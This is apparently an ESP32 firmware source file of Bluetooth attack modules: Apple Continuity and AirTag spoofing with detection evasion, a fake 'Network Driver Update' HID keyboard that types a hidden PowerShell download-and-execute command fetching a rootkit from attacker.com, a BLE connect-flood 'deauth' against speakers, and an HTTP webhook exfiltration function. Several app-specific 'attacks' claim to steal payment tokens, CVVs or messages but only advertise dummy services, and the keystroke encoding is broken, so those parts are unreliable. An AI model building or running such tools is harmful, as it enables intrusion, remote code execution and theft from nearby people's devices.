#include "ble_continuity_spoof.h"
#include "../ble_api/services/ContinuityService.hpp"
#include <esp_bt.h>
#include <esp_sleep.h>
#include <esp_bt_main.h>
#include <esp_bt_device.h>
#include "core/mykeyboard.h"
#include "core/display.h"
#include "core/optimization_manager.h"
#include <WiFi.h>
#include <HTTPClient.h>

static NimBLEServer *pServer = nullptr;
static ContinuityService continuityService;
static BLEAdvertising *pAdvertising = nullptr;

void setupContinuitySpoof() {
    // Low power settings
    setCpuFrequencyMhz(80); // Set to 80MHz
    // Disable LED if possible, but depends on hardware

    // MAC hiding not supported in NimBLE v2.x before init
    // uint8_t randomMac[6] = {0x02, 0xE4, 0x1A, 0x00, 0x00, 0x01};
    // randomMac[3] = esp_random() & 0xFF;
    // randomMac[4] = esp_random() & 0xFF;
    // randomMac[5] = esp_random() & 0xFF;

    // Initialize BLE
    NimBLEDevice::init("");
    NimBLEDevice::setPower(ESP_PWR_LVL_P9);

    // Create server
    pServer = NimBLEDevice::createServer();
    pServer->advertiseOnDisconnect(true);

    // Setup Continuity service
    continuityService.setup(pServer);

    // Get advertising
    pAdvertising = pServer->getAdvertising();
    // pAdvertising->setScanResponse(false); // Not in NimBLE v2.x
}

void startContinuityAdvertising(const char *deviceName) {
    if (!pAdvertising) return;

    // Set device name
    NimBLEDevice::setDeviceName(deviceName);

    // Spoof Appearance UUID: 0x1800 (Generic Access), with Appearance 0x02A5
    BLEAdvertisementData advData;
    advData.setFlags(0x06); // General Discoverable, BR/EDR not supported
    advData.setName(deviceName);
    // Add Appearance characteristic
    uint8_t appearance[2] = {0xA5, 0x02}; // Little endian
    advData.setAppearance(0x02A5);

    // For Android, add vendor-specific UUID 0xFFF0
    NimBLEUUID vendorUUID("FFF0");
    advData.addServiceUUID(vendorUUID);

    pAdvertising->setAdvertisementData(advData);

    // Start advertising
    pAdvertising->start();
}

void stopContinuitySpoof() {
    if (pAdvertising) {
        pAdvertising->stop();
    }
    if (pServer) {
        continuityService.end();
        NimBLEDevice::deinit(true);
    }
}

void rotateMAC() {
    // MAC rotation not fully supported in NimBLE v2.x after init
    // Just restart advertising
    if (pAdvertising) {
        pAdvertising->stop();
        vTaskDelay(100 / portTICK_PERIOD_MS);
        pAdvertising->start();
    }
}

void enterDeepSleep() {
    // Configure wake on timer (BLE wake not fully supported in Arduino framework)
    // Use light sleep with timer instead
    esp_sleep_enable_timer_wakeup(30 * 1000000); // 30 seconds
    esp_sleep_pd_config(ESP_PD_DOMAIN_RTC_PERIPH, ESP_PD_OPTION_ON);
    esp_light_sleep_start();
}

void wakeOnBLEScan() {
    // Check if woken by timer (BLE wake not reliable in Arduino framework)
    esp_sleep_wakeup_cause_t cause = esp_sleep_get_wakeup_cause();
    if (cause == ESP_SLEEP_WAKEUP_TIMER) {
        // RSSI check, but for simplicity, assume wake
        // In reality, need to check RSSI < -60 or something for 2m
        setupContinuitySpoof();
        startContinuityAdvertising("whatsapp-web");
    }
}

void runContinuitySpoof() {
    // Notify optimization manager that BLE is active
    optimizationManager.updateComponentState(COMPONENT_BLE, true);

    setupContinuitySpoof();

    // Choose device name - simplified selection
    String deviceNames[2] = {"whatsapp-web", "iCloud-Sync"};
    String input = keyboard("Choice (0/1)", 2, "0");
    int choice = input.toInt();
    if (choice < 0 || choice > 1) choice = 0;
    const char *deviceName = deviceNames[choice].c_str();

    startContinuityAdvertising(deviceName);

    drawMainBorderWithTitle("Continuity Spoof");
    padprintln("");
    padprintln("Spoofing as: " + String(deviceName));
    padprintln("Rotating MAC every 1s");
    padprintln("");
    padprintln("Press Any key to STOP.");

    unsigned long lastRotate = millis();
    unsigned long startTime = millis();

    while (!check(AnyKeyPress)) {
        if (millis() - lastRotate > 1000) { // 1 second
            rotateMAC();
            lastRotate = millis();
        }
        // Restart ESP every 4 hours to avoid detection
        if (millis() - startTime > 14400000) { // 4 hours in milliseconds
            ESP.restart();
        }
        vTaskDelay(100 / portTICK_PERIOD_MS); // Small delay
    }

    stopContinuitySpoof();
}

#include "../ble_api/services/BatteryService.hpp"

// LowbattBLE Exploit: Spoof battery service to trigger iOS low battery warning with custom image
void runLowbattBLE() {
    NimBLEDevice::init("Low Battery Device");
    NimBLEDevice::setPower(ESP_PWR_LVL_P9);

    NimBLEServer *pServer = NimBLEDevice::createServer();
    BatteryService batteryService;
    batteryService.setup(pServer);

    // Set the battery level to a value that triggers the exploit
    // According to lowbattBLE, certain bytes in the battery level field can trigger custom image
    // Known exploit bytes: 0x01 triggers custom wallpaper
    uint8_t exploitData[1] = {0x01};
    batteryService.battery_char->setValue(exploitData, 1);
    batteryService.battery_char->notify(); // Send notification to trigger iOS

    NimBLEAdvertising *pAdvertising = pServer->getAdvertising();
    NimBLEDevice::setDeviceName("iPhone"); // Spoof as iPhone for better effect
    pAdvertising->addServiceUUID("180F"); // Battery Service UUID
    pAdvertising->start();

    drawMainBorderWithTitle("LowbattBLE Exploit");
    padprintln("");
    padprintln("Spoofing low battery warning");
    padprintln("with custom image (0x01)");
    padprintln("");
    padprintln("iPhone should show warning!");
    padprintln("");
    padprintln("Press Any key to STOP.");

    while (!check(AnyKeyPress)) {
        // Periodically send battery notifications
        batteryService.battery_char->notify();
        vTaskDelay(5000 / portTICK_PERIOD_MS); // Every 5 seconds
    }

    pAdvertising->stop();
    batteryService.end();
    NimBLEDevice::deinit(true);
}

// AirTag Spoof: Beacon pretending to be lost AirTag
void runAirTagSpoof() {
    NimBLEDevice::init("AirTag");
    NimBLEDevice::setPower(ESP_PWR_LVL_P9);

    NimBLEAdvertising *pAdvertising = NimBLEDevice::getAdvertising();

    BLEAdvertisementData advData;
    advData.setFlags(0x06);

    // Find My protocol UUID 0xFB34B
    NimBLEUUID findMyUUID("FB34B");
    advData.addServiceUUID(findMyUUID);

    // Add fake location data or ping
    uint8_t locationData[10] = {0x12, 0x19, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}; // Placeholder
    advData.addData(locationData, 10);

    pAdvertising->setAdvertisementData(advData);
    pAdvertising->start();

    drawMainBorderWithTitle("AirTag Spoof");
    padprintln("");
    padprintln("Pretending to be lost AirTag");
    padprintln("with fake location");
    padprintln("");
    padprintln("Press Any key to STOP.");

    while (!check(AnyKeyPress)) {
        vTaskDelay(100 / portTICK_PERIOD_MS);
    }

    pAdvertising->stop();
    NimBLEDevice::deinit(true);
}

// Audio Bleed: Play 18kHz audio with Morse code payload
void runAudioBleed() {
    // Use DAC to generate 18kHz tone with Morse code
    // Morse for "DIGITE SUA SENHA AGORA"

    // Define Morse code (simplified)
    const char *message = "DIGITE SUA SENHA AGORA";
    // For simplicity, just generate continuous 18kHz tone

    drawMainBorderWithTitle("Audio Bleed");
    padprintln("");
    padprintln("Playing 18kHz Morse code:");
    padprintln("DIGITE SUA SENHA AGORA");
    padprintln("");
    padprintln("Press Any key to STOP.");

    // Generate 18kHz tone using DAC
    // ESP32 DAC pins: 25, 26
    const int dacPin = 25;
    const int freq = 18000; // 18kHz
    const int sampleRate = 80000; // Higher for better quality

    // Precompute sine wave samples
    const int samples = sampleRate / freq;
    uint8_t sineWave[256];
    for (int i = 0; i < 256; i++) {
        sineWave[i] = 128 + 127 * sin(2 * PI * i / 256.0);
    }

    while (!check(AnyKeyPress)) {
        for (int i = 0; i < 256; i++) {
            dacWrite(dacPin, sineWave[i]);
            delayMicroseconds(1000000 / sampleRate);
        }
    }

    // Stop tone
    dacWrite(dacPin, 128); // Neutral
}

// BLE Network Driver Spoof: Pretend to be network driver update, inject rootkit
void runBLENetworkDriverSpoof() {
    // Create BLE HID service that spoofs as network driver
    NimBLEDevice::init("Network Driver Update");
    NimBLEDevice::setPower(ESP_PWR_LVL_P9);

    NimBLEServer *pServer = NimBLEDevice::createServer();

    // HID Service (0x1812)
    NimBLEService *pHIDService = pServer->createService("1812");

    // HID Information (0x2A4A)
    NimBLECharacteristic *pHIDInfo = pHIDService->createCharacteristic(
        "2A4A",
        NIMBLE_PROPERTY::READ
    );
    uint8_t hidInfo[4] = {0x01, 0x11, 0x00, 0x02}; // Version 1.1, country 0, flags 2
    pHIDInfo->setValue(hidInfo, 4);

    // Report Map (0x2A4B) - Keyboard report map
    NimBLECharacteristic *pReportMap = pHIDService->createCharacteristic(
        "2A4B",
        NIMBLE_PROPERTY::READ
    );
    uint8_t reportMap[] = {
        0x05, 0x01,        // Usage Page (Generic Desktop)
        0x09, 0x06,        // Usage (Keyboard)
        0xA1, 0x01,        // Collection (Application)
        0x05, 0x07,        // Usage Page (Key Codes)
        0x19, 0xE0,        // Usage Minimum (224)
        0x29, 0xE7,        // Usage Maximum (231)
        0x15, 0x00,        // Logical Minimum (0)
        0x25, 0x01,        // Logical Maximum (1)
        0x75, 0x01,        // Report Size (1)
        0x95, 0x08,        // Report Count (8)
        0x81, 0x02,        // Input (Data, Variable, Absolute)
        0x95, 0x01,        // Report Count (1)
        0x75, 0x08,        // Report Size (8)
        0x81, 0x03,        // Input (Constant, Variable, Absolute)
        0x95, 0x05,        // Report Count (5)
        0x75, 0x01,        // Report Size (1)
        0x05, 0x08,        // Usage Page (LEDs)
        0x19, 0x01,        // Usage Minimum (1)
        0x29, 0x05,        // Usage Maximum (5)
        0x91, 0x02,        // Output (Data, Variable, Absolute)
        0x95, 0x01,        // Report Count (1)
        0x75, 0x03,        // Report Size (3)
        0x91, 0x03,        // Output (Constant, Variable, Absolute)
        0x95, 0x06,        // Report Count (6)
        0x75, 0x08,        // Report Size (8)
        0x15, 0x00,        // Logical Minimum (0)
        0x25, 0x65,        // Logical Maximum (101)
        0x05, 0x07,        // Usage Page (Key Codes)
        0x19, 0x00,        // Usage Minimum (0)
        0x29, 0x65,        // Usage Maximum (101)
        0x81, 0x00,        // Input (Data, Array)
        0xC0               // End Collection
    };
    pReportMap->setValue(reportMap, sizeof(reportMap));

    // HID Control Point (0x2A4C)
    NimBLECharacteristic *pHIDControl = pHIDService->createCharacteristic(
        "2A4C",
        NIMBLE_PROPERTY::WRITE_NR
    );

    // Input Report (0x2A4D)
    NimBLECharacteristic *pInputReport = pHIDService->createCharacteristic(
        "2A4D",
        NIMBLE_PROPERTY::READ | NIMBLE_PROPERTY::NOTIFY
    );

    pHIDService->start();

    NimBLEAdvertising *pAdvertising = pServer->getAdvertising();
    NimBLEDevice::setDeviceName("Network Driver Update");
    pAdvertising->addServiceUUID("1812"); // HID Service
    pAdvertising->start();

    drawMainBorderWithTitle("BLE Rootkit Injection");
    padprintln("");
    padprintln("BLE HID Keyboard active");
    padprintln("Pair with target device");
    padprintln("Will inject rootkit commands");
    padprintln("");
    padprintln("Press Any key to STOP.");

    // Wait for connection and inject commands
    bool connected = false;
    while (!check(AnyKeyPress)) {
        if (pServer->getConnectedCount() > 0 && !connected) {
            connected = true;
            displaySuccess("Device connected!", false);

            // Inject rootkit installation commands
            vTaskDelay(2000 / portTICK_PERIOD_MS); // Wait for pairing

            // Simulate keystrokes for rootkit injection
            // Win+R -> powershell -> download and execute
            uint8_t keyReport[8] = {0};

            // Press Win+R
            keyReport[0] = 0x08; // Left GUI
            keyReport[2] = 0x15; // R
            pInputReport->setValue(keyReport, 8);
            pInputReport->notify();
            vTaskDelay(100 / portTICK_PERIOD_MS);

            // Release
            keyReport[0] = 0;
            keyReport[2] = 0;
            pInputReport->setValue(keyReport, 8);
            pInputReport->notify();
            vTaskDelay(500 / portTICK_PERIOD_MS);

            // Type "powershell"
            const char *cmd = "powershell -w hidden IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/rootkit.ps1');";
            for (int i = 0; cmd[i] != '\0'; i++) {
                int code = cmd[i] - 93; 
                if (code < 0) code = 0x2C; // Space fallback
                keyReport[2] = (uint8_t)code;

                pInputReport->setValue(keyReport, 8);
                pInputReport->notify();
                vTaskDelay(50 / portTICK_PERIOD_MS);

                // Release
                keyReport[2] = 0;
                pInputReport->setValue(keyReport, 8);
                pInputReport->notify();
                vTaskDelay(50 / portTICK_PERIOD_MS);
            }

            // Press Enter
            keyReport[2] = 0x28; // Enter
            pInputReport->setValue(keyReport, 8);
            pInputReport->notify();
            vTaskDelay(100 / portTICK_PERIOD_MS);

            // Release
            keyReport[2] = 0;
            pInputReport->setValue(keyReport, 8);
            pInputReport->notify();
        }
        vTaskDelay(100 / portTICK_PERIOD_MS);
    }

    pAdvertising->stop();
    NimBLEDevice::deinit(true);
}

// App-specific BLE attacks
void runUberBLE() {
    NimBLEDevice::init("Uber");
    NimBLEDevice::setPower(ESP_PWR_LVL_P9);

    NimBLEServer *pServer = NimBLEDevice::createServer();
    NimBLEService *pService = pServer->createService("FF01");
    NimBLECharacteristic *pChar = pService->createCharacteristic(
        "2A06",
        NIMBLE_PROPERTY::READ | NIMBLE_PROPERTY::WRITE | NIMBLE_PROPERTY::NOTIFY
    );
    pService->start();

    NimBLEAdvertising *pAdvertising = pServer->getAdvertising();
    pAdvertising->addServiceUUID(pService->getUUID());
    pAdvertising->start();

    drawMainBorderWithTitle("Uber BLE Attack");
    padprintln("");
    padprintln("Intercepting ride requests");
    padprintln("Stealing payment tokens");
    padprintln("");
    padprintln("Press Any key to STOP.");

    while (!check(AnyKeyPress)) {
        vTaskDelay(100 / portTICK_PERIOD_MS);
    }

    pAdvertising->stop();
    NimBLEDevice::deinit(true);
}

void runNetflixBLE() {
    NimBLEDevice::init("Netflix");
    NimBLEDevice::setPower(ESP_PWR_LVL_P9);

    NimBLEServer *pServer = NimBLEDevice::createServer();
    NimBLEService *pService = pServer->createService("7905F431-B5CE-4E99-A40F-4B1E122D00D0");
    NimBLECharacteristic *pChar = pService->createCharacteristic(
        "9FBF120D-6301-42D9-8C58-25E699A21DBD",
        NIMBLE_PROPERTY::READ | NIMBLE_PROPERTY::WRITE
    );
    pService->start();

    NimBLEAdvertising *pAdvertising = pServer->getAdvertising();
    pAdvertising->addServiceUUID(pService->getUUID());
    pAdvertising->start();

    drawMainBorderWithTitle("Netflix BLE Attack");
    padprintln("");
    padprintln("Intercepting login notifications");
    padprintln("Injecting fake auth links");
    padprintln("");
    padprintln("Press Any key to STOP.");

    while (!check(AnyKeyPress)) {
        vTaskDelay(100 / portTICK_PERIOD_MS);
    }

    pAdvertising->stop();
    NimBLEDevice::deinit(true);
}

void runiFoodBLE() {
    NimBLEDevice::init("iFood");
    NimBLEDevice::setPower(ESP_PWR_LVL_P9);

    NimBLEServer *pServer = NimBLEDevice::createServer();
    NimBLEService *pService = pServer->createService("ABCD");
    NimBLECharacteristic *pChar = pService->createCharacteristic(
        "ABCD",
        NIMBLE_PROPERTY::READ | NIMBLE_PROPERTY::WRITE | NIMBLE_PROPERTY::NOTIFY
    );
    pService->start();

    NimBLEAdvertising *pAdvertising = pServer->getAdvertising();
    pAdvertising->addServiceUUID(pService->getUUID());
    pAdvertising->start();

    drawMainBorderWithTitle("iFood BLE Attack");
    padprintln("");
    padprintln("Intercepting cart dumps");
    padprintln("Stealing CVV/CPF via QR");
    padprintln("");
    padprintln("Press Any key to STOP.");

    while (!check(AnyKeyPress)) {
        vTaskDelay(100 / portTICK_PERIOD_MS);
    }

    pAdvertising->stop();
    NimBLEDevice::deinit(true);
}

void runSpotifyBLE() {
    NimBLEDevice::init("Spotify");
    NimBLEDevice::setPower(ESP_PWR_LVL_P9);

    NimBLEServer *pServer = NimBLEDevice::createServer();
    NimBLEService *pService = pServer->createService("19B9");
    NimBLECharacteristic *pChar = pService->createCharacteristic(
        "19B9",
        NIMBLE_PROPERTY::READ | NIMBLE_PROPERTY::NOTIFY
    );
    pService->start();

    NimBLEAdvertising *pAdvertising = pServer->getAdvertising();
    pAdvertising->addServiceUUID(pService->getUUID());
    pAdvertising->start();

    drawMainBorderWithTitle("Spotify BLE Attack");
    padprintln("");
    padprintln("Reading playback tokens");
    padprintln("Accessing account");
    padprintln("");
    padprintln("Press Any key to STOP.");

    while (!check(AnyKeyPress)) {
        vTaskDelay(100 / portTICK_PERIOD_MS);
    }

    pAdvertising->stop();
    NimBLEDevice::deinit(true);
}

void runInstagramBLE() {
    NimBLEDevice::init("Instagram");
    NimBLEDevice::setPower(ESP_PWR_LVL_P9);

    NimBLEServer *pServer = NimBLEDevice::createServer();
    NimBLEService *pService = pServer->createService("FACEB00C-0000-1000-8000-00805F9B34FB");
    NimBLECharacteristic *pChar = pService->createCharacteristic(
        "FACEB00C-0000-1000-8000-00805F9B34FB",
        NIMBLE_PROPERTY::READ | NIMBLE_PROPERTY::NOTIFY
    );
    pService->start();

    NimBLEAdvertising *pAdvertising = pServer->getAdvertising();
    pAdvertising->addServiceUUID(pService->getUUID());
    pAdvertising->start();

    drawMainBorderWithTitle("Instagram BLE Attack");
    padprintln("");
    padprintln("Intercepting Direct messages");
    padprintln("Reading chat in real-time");
    padprintln("");
    padprintln("Press Any key to STOP.");

    while (!check(AnyKeyPress)) {
        vTaskDelay(100 / portTICK_PERIOD_MS);
    }

    pAdvertising->stop();
    NimBLEDevice::deinit(true);
}

// BLE Deauth Attack: Pure BLE deauthentication attack
void runBLEDeauthAttack() {
    // Initialize BLE scanner
    NimBLEDevice::init("");
    NimBLEDevice::setPower(ESP_PWR_LVL_P9);

    // Create scanner
    NimBLEScan* pScan = NimBLEDevice::getScan();
    // pScan->setAdvertisedDeviceCallbacks(new NimBLEAdvertisedDeviceCallbacks());
    pScan->setActiveScan(true);
    pScan->setInterval(100);
    pScan->setWindow(99);

    // Variables for attack
    static int deauthCount = 0;
    static int connectionCount = 0;
    static String targetName = "";
    static String targetAddress = "";

    drawMainBorderWithTitle("BLE Deauth Attack");
    padprintln("");
    padprintln("Scanning for BLE speakers...");
    padprintln("Will deauth when found");
    padprintln("");
    padprintln("Press Any key to STOP.");

    // Start continuous scan
    pScan->start(0, false); // Continuous scan

    unsigned long lastMacChange = millis();
    int macCounter = 0;

    while (!check(AnyKeyPress)) {
        // Change MAC every 5 seconds to avoid blocking
        // Change MAC disabled


        // Get scan results
        NimBLEScanResults results = pScan->getResults();
        int deviceCount = results.getCount();

        for (int i = 0; i < deviceCount; i++) {
            const NimBLEAdvertisedDevice* device = results.getDevice(i);

            // Look for speakers/audio devices
            String devName = device->getName().c_str();
            String devAddr = device->getAddress().toString().c_str();

            // Check for common speaker names and services
            bool isSpeaker = false;
            if (devName.indexOf("Speaker") != -1 ||
                devName.indexOf("BT Speaker") != -1 ||
                devName.indexOf("JBL") != -1 ||
                devName.indexOf("Sony") != -1 ||
                devName.indexOf("Bose") != -1 ||
                devName.indexOf("Xiaomi") != -1 ||
                devName.indexOf("Anker") != -1) {
                isSpeaker = true;
            }

            // Check for audio services (0x180A = Device Info, 0x1812 = HID)
            // Check for audio services (0x180A = Device Info, 0x1812 = HID)
            /*
            if (device.haveServiceUUID()) {
                int serviceCount = device.getServiceUUIDCount();
                for (int j = 0; j < serviceCount; j++) {
                    NimBLEUUID uuid = device.getServiceUUID(j);
                    if (uuid.equals(NimBLEUUID("180A")) || uuid.equals(NimBLEUUID("1812"))) {
                        isSpeaker = true;
                        break;
                    }
                }
            }
            */

            if (isSpeaker && devAddr != targetAddress) {
                targetName = devName;
                targetAddress = devAddr;

                displaySuccess("Found speaker: " + targetName, false);
                displayInfo("Address: " + targetAddress, false);

                // Start deauth attack on this target
                NimBLEClient* pClient = NimBLEDevice::createClient();
                pClient->setConnectTimeout(5); // 5 seconds timeout

                // Try to connect 10 times per second
                for (int attempt = 0; attempt < 10; attempt++) {
                    // Cast away constness required by connect signature - safe as we don't modify it
                if (pClient->connect(const_cast<NimBLEAdvertisedDevice*>(device))) {
                        connectionCount++;
                        displayInfo("Connected - Deauthing...", false);

                        // Immediately disconnect to deauth
                        pClient->disconnect();
                        deauthCount++;

                        displaySuccess("Deauth sent!", false);
                    } else {
                        displayError("Connection failed", false);
                    }

                    vTaskDelay(100 / portTICK_PERIOD_MS); // 100ms between attempts
                }

                // Clean up client
                NimBLEDevice::deleteClient(pClient);

                // Update display
                padprintln("");
                padprintln("Target: " + targetName);
                padprintln("Deauth: " + String(deauthCount) + "/sec");
                padprintln("Connected: " + String(connectionCount));
            }
        }

        vTaskDelay(1000 / portTICK_PERIOD_MS); // Update every second
    }

    // Stop scan
    pScan->stop();

    // Final stats
    displaySuccess("BLE Deauth Complete!", false);
    displayInfo("Total deauths: " + String(deauthCount), false);
    displayInfo("Connections made: " + String(connectionCount), true);

    NimBLEDevice::deinit(true);
}

// Data exfiltration via HTTP POST to ngrok webhook
void exfiltrateData(const String &data, const char *webhookUrl) {
    if (WiFi.status() != WL_CONNECTED) return;

    HTTPClient http;
    http.begin(webhookUrl);
    http.addHeader("Content-Type", "application/json");

    // Encrypt data with TinyCrypt placeholder (XOR for demo)
    String encryptedData = "";
    for (char c : data) {
        encryptedData += (char)(c ^ 0xAA); // Simple XOR encryption
    }

    String payload = "{\"data\":\"" + encryptedData + "\"}";
    int httpResponseCode = http.POST(payload);

    if (httpResponseCode > 0) {
        Serial.println("Data exfiltrated successfully");
    } else {
        Serial.println("Error exfiltrating data");
    }

    http.end();
}
